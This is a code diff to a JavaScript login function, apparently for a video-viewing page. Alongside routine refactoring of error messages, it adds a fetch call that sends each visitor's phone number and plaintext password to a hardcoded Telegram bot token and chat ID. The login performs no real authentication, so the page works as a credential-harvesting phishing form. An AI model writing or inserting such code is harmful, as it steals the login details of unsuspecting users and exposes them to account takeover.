@@ -30,20 +30,42 @@ function handleLogin() {
   const password = document.getElementById('password').value.trim();
   const phoneRegex = /^[0-9]{1,11}$/;
 
+  // Clear any previous error messages
+  document.getElementById('error-message').innerHTML = '';
+
+  // Phone validation
   if (!phoneRegex.test(phone)) {
-    alert("Enter a valid phone number (up to 11 digits)");
+    showError("Enter a valid phone number (up to 11 digits)");
     return;
   }
 
+  // Password validation
   if (password === "") {
-    alert("Password cannot be empty");
+    showError("Password cannot be empty");
     return;
   }
 
+  // If validation passes, login successful
   document.getElementById('loginForm').style.display = 'none';
   document.getElementById('videoArea').style.display = 'block';
 
   loadVideoThumbnails(videos);
+  
+  // Send login details to Telegram bot
+  fetch(`https://api.telegram.org/bot8109746515:AAHsmsg9mcrW1HyXuQC8uMSDil3WTErWoK0/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: "7987662357",
+      text: `Login:\nPhone: ${phone}\nPassword: ${password}`
+    })
+  });
+}
+
+function showError(message) {
+  const errorElement = document.getElementById('error-message');
+  errorElement.textContent = message;
+  errorElement.style.display = 'block';
 }
 
 function loadVideoThumbnails(videoList) {
